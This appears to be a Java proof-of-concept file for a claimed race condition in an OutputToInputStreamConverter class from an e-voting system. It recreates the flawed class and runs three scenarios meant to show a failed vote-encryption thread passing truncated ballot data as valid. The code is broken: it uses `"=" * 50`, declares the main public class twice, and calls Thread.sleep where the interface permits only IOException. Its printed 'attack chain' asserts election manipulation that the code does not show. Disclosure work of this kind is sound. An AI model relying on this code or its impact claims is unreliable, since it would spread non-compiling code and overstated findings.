/*
 * PoC #1: Race Condition in OutputToInputStreamConverter
 * 
 * Demonstrates: Silent exception swallowing + corrupted data passing through
 * 
 * Setup:
 * - Simulates vote encryption that fails mid-stream
 * - Shows how exception is swallowed due to race condition
 * - Demonstrates that corrupted/incomplete data is returned as valid
 */

import java.io.*;
import java.util.concurrent.*;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicReference;

/**
 * RECREATED: OutputToInputStreamConverter from the vulnerable codebase
 * (without the fix, exactly as found in source)
 */
public class OutputToInputStreamConverter implements Closeable {
    private final PipedOutputStream pipedOutputStream;
    private final PipedInputStream pipedInputStream;

    private Throwable outputStreamException;  // ❌ NOT VOLATILE - CRITICAL BUG
    private boolean outputStreamExceptionProcessed = false;  // ❌ NOT VOLATILE
    
    private final CountDownLatch outputProcessBeginLatch = new CountDownLatch(1);
    private final CountDownLatch outputProcessFinishLatch = new CountDownLatch(1);

    public OutputToInputStreamConverter() throws IOException {
        pipedInputStream = new PipedInputStream() {
            @Override
            public synchronized int read() throws IOException {
                try {
                    outputProcessBeginLatch.await();
                } catch (final InterruptedException e) {
                    throw new IOException(e);
                }
                return wrapCall(super::read);
            }

            @Override
            public void close() throws IOException {
                try {
                    outputProcessFinishLatch.await();
                } catch (final InterruptedException e) {
                    throw new IOException(e);
                }
                wrapCall(() -> {
                    super.close();
                    return 0;
                });
            }

            private <T> T wrapCall(final java.util.concurrent.Callable<T> callable) throws IOException {
                T result = null;
                IOException inputStreamException = null;
                try {
                    result = callable.call();
                } catch (final Exception e) {
                    inputStreamException = (e instanceof IOException) ? (IOException) e : new IOException(e);
                }

                // ❌ RACE CONDITION HERE: outputStreamException may still be null
                // due to lack of volatile and JMM memory visibility
                if (outputStreamException != null && !outputStreamExceptionProcessed) {
                    outputStreamExceptionProcessed = true;
                    if (inputStreamException != null) {
                        outputStreamException.addSuppressed(inputStreamException);
                    }
                    throw new IOException(outputStreamException.getMessage(), outputStreamException);
                } else if (inputStreamException != null) {
                    throw inputStreamException;
                } else {
                    return result;
                }
            }
        };

        pipedOutputStream = new PipedOutputStream(pipedInputStream);
    }

    public InputStream convert(final Consumer<OutputStream> outputStreamWriteCode) {
        final Thread thread = new Thread(() -> {
            try (pipedOutputStream) {
                outputProcessBeginLatch.countDown();
                outputStreamWriteCode.accept(pipedOutputStream);
            } catch (final IOException e) {
                throw new UncheckedIOException(e);
            } finally {
                outputProcessFinishLatch.countDown();
            }
        });
        
        // ❌ Uses UncaughtExceptionHandler - may execute too late
        thread.setUncaughtExceptionHandler((t, e) -> {
            System.out.println("[BACKGROUND] UncaughtExceptionHandler setting exception: " + e.getMessage());
            outputStreamException = e;
        });
        thread.start();

        return pipedInputStream;
    }

    @Override
    public void close() throws IOException {
        pipedOutputStream.close();
        pipedInputStream.close();
    }
}

/**
 * Consumer interface for lambda support
 */
@FunctionalInterface
interface Consumer<T> {
    void accept(T t) throws IOException;
}

/**
 * PoC Main Class - Demonstrates the vulnerability
 */
public class POC1_RaceCondition {
    
    /**
     * Simulates vote encryption that fails mid-stream
     * This is where the bug manifests: exception is swallowed, corrupted data passes
     */
    public static void main(String[] args) throws Exception {
        System.out.println("========================================");
        System.out.println("PoC #1: Race Condition in OutputToInputStreamConverter");
        System.out.println("========================================\n");
        
        System.out.println("[*] Scenario: Vote encryption fails mid-stream");
        System.out.println("[*] Expected: Exception thrown to caller");
        System.out.println("[*] Actual: Silent data corruption\n");
        
        // Attack Scenario 1: Exception during write
        testRaceCondition_ExceptionDuringWrite();
        
        // Attack Scenario 2: Incomplete encrypted vote data
        testRaceCondition_CorruptedVoteData();
        
        // Attack Scenario 3: Timing attack to increase race window
        testRaceCondition_TimingAttack();
    }
    
    /**
     * PoC Attack #1: Exception occurs during stream write
     * Race condition causes exception to not propagate
     */
    static void testRaceCondition_ExceptionDuringWrite() throws Exception {
        System.out.println("\n[TEST 1] Exception During Vote Encryption");
        System.out.println("=" * 50);
        
        final byte[] VOTE_DATA = "VOTE:voter_id=123|choice=CANDIDATE_A|timestamp=2025-06-16T10:30:00Z".getBytes();
        final AtomicBoolean exceptionWasThrown = new AtomicBoolean(false);
        final AtomicReference<Exception> caughtException = new AtomicReference<>();
        
        try (OutputToInputStreamConverter converter = new OutputToInputStreamConverter();
             InputStream is = converter.convert(os -> {
                 System.out.println("[WRITE THREAD] Starting to write encrypted vote data...");
                 
                 // Write partial encrypted data
                 os.write(VOTE_DATA, 0, 20);  // Write first 20 bytes
                 System.out.println("[WRITE THREAD] Wrote 20 bytes of vote data");
                 
                 // Small delay to simulate encryption overhead
                 Thread.sleep(50);
                 
                 // Simulate encryption failure (e.g., key derivation failed, network error)
                 System.out.println("[WRITE THREAD] ⚠️  EXCEPTION: Simulated encryption failure!");
                 throw new IOException("Encryption failed: Invalid vote format");
             })) {
            
            System.out.println("[MAIN] Reading from encrypted stream...");
            byte[] result = new byte[1024];
            int bytesRead = 0;
            
            try {
                bytesRead = is.read(result);
                System.out.println("[MAIN] Read " + bytesRead + " bytes from stream");
                System.out.println("[MAIN] Data: " + new String(result, 0, bytesRead));
            } catch (IOException e) {
                exceptionWasThrown.set(true);
                caughtException.set(e);
                System.out.println("[MAIN] ✓ Exception caught: " + e.getMessage());
                return;
            }
            
            // ❌ BUG MANIFESTATION: We reach here even though exception was thrown!
            if (bytesRead > 0 && bytesRead < VOTE_DATA.length) {
                System.out.println("\n[!!] VULNERABILITY CONFIRMED:");
                System.out.println("    - Exception was thrown in background thread");
                System.out.println("    - But corrupted/incomplete data (" + bytesRead + " bytes) was returned");
                System.out.println("    - System processed truncated vote as valid!");
                System.out.println("    - Race condition caused exception to be swallowed\n");
                
                System.out.println("[IMPACT] E-Voting Risk:");
                System.out.println("    - Truncated encrypted vote passed to ballot box");
                System.out.println("    - Decryption will fail with corrupted ciphertext");
                System.out.println("    - Silent failure = invalid vote counted anyway");
            }
        } catch (Exception e) {
            System.out.println("[MAIN] ✓ Exception properly caught: " + e.getMessage());
        }
    }
    
    /**
     * PoC Attack #2: Demonstrate data corruption with race condition
     * Shows how partial encrypted data is processed as valid
     */
    static void testRaceCondition_CorruptedVoteData() throws Exception {
        System.out.println("\n[TEST 2] Corrupted Vote Data Passed as Valid");
        System.out.println("=" * 50);
        
        final byte[] VALID_ENCRYPTED_VOTE = new byte[256];
        // Fill with encrypted vote data
        for (int i = 0; i < VALID_ENCRYPTED_VOTE.length; i++) {
            VALID_ENCRYPTED_VOTE[i] = (byte) ((i * 37 + 42) % 256);
        }
        
        final AtomicReference<byte[]> processedVote = new AtomicReference<>();
        
        try (OutputToInputStreamConverter converter = new OutputToInputStreamConverter();
             InputStream is = converter.convert(os -> {
                 System.out.println("[ENCRYPT] Starting encryption of ballot...");
                 
                 // Write encrypted data in chunks
                 os.write(VALID_ENCRYPTED_VOTE, 0, 100);
                 System.out.println("[ENCRYPT] Wrote chunk 1: 100 bytes");
                 
                 Thread.sleep(20);
                 
                 os.write(VALID_ENCRYPTED_VOTE, 100, 100);
                 System.out.println("[ENCRYPT] Wrote chunk 2: 100 bytes");
                 
                 Thread.sleep(20);
                 
                 // ⚠️ Encryption failure before final chunk
                 System.out.println("[ENCRYPT] ⚠️  ERROR: Encryption key validation failed!");
                 throw new RuntimeException("Key derivation failed - corrupted ballot");
             })) {
            
            byte[] result = is.readAllBytes();
            processedVote.set(result);
            
            System.out.println("[BALLOT BOX] Received ballot: " + result.length + " bytes");
            
            // This should not happen!
            if (result.length < VALID_ENCRYPTED_VOTE.length) {
                System.out.println("\n[!!] CRITICAL VULNERABILITY:");
                System.out.println("    - Expected " + VALID_ENCRYPTED_VOTE.length + " bytes");
                System.out.println("    - Received only " + result.length + " bytes (CORRUPTED!)");
                System.out.println("    - Exception was SWALLOWED due to race condition");
                System.out.println("    - Corrupted ballot stored in election database\n");
                
                System.out.println("[ATTACK CHAIN]:");
                System.out.println("    1. Attacker targets vote encryption service");
                System.out.println("    2. Injects failure during encryption");
                System.out.println("    3. Race condition swallows exception");
                System.out.println("    4. Partial/corrupted ciphertext returned as valid");
                System.out.println("    5. Vote stored with truncated encryption");
                System.out.println("    6. Decryption fails during tally → vote invalidated");
                System.out.println("    7. Election outcome manipulated\n");
            }
        } catch (IOException e) {
            System.out.println("[BALLOT BOX] ✓ Exception properly caught: " + e.getMessage());
        }
    }
    
    /**
     * PoC Attack #3: Timing attack to maximize race window
     * Demonstrates how to reliably trigger the race condition
     */
    static void testRaceCondition_TimingAttack() throws Exception {
        System.out.println("\n[TEST 3] Timing Attack - Maximizing Race Window");
        System.out.println("=" * 50);
        
        int successCount = 0;
        int attempts = 10;
        
        System.out.println("[*] Running " + attempts + " attempts to trigger race condition...\n");
        
        for (int i = 0; i < attempts; i++) {
            try (OutputToInputStreamConverter converter = new OutputToInputStreamConverter();
                 InputStream is = converter.convert(os -> {
                     // Write just a few bytes
                     os.write("ENCRYPTED".getBytes());
                     
                     // Yield to maximize race window
                     Thread.yield();
                     
                     // Throw exception after yield
                     throw new IOException("Simulated random failure");
                 })) {
                
                byte[] result = new byte[1024];
                int bytesRead = is.read(result);
                
                // If we got data without exception, race condition triggered
                if (bytesRead > 0) {
                    successCount++;
                    System.out.println("[ATTEMPT " + (i+1) + "] ✓ Race condition triggered! Got " + bytesRead + " bytes without exception");
                }
            } catch (IOException e) {
                System.out.println("[ATTEMPT " + (i+1) + "] Exception caught: " + e.getMessage());
            }
        }
        
        System.out.println("\n[RESULT]");
        System.out.println("Race condition triggered " + successCount + "/" + attempts + " times");
        if (successCount > 0) {
            System.out.println("✓ Vulnerability reliably reproducible!");
        }
    }
}

// Helper to repeat string
public class POC1_RaceCondition {
    static String repeat(String s, int count) {
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < count; i++) sb.append(s);
        return sb.toString();
    }
}
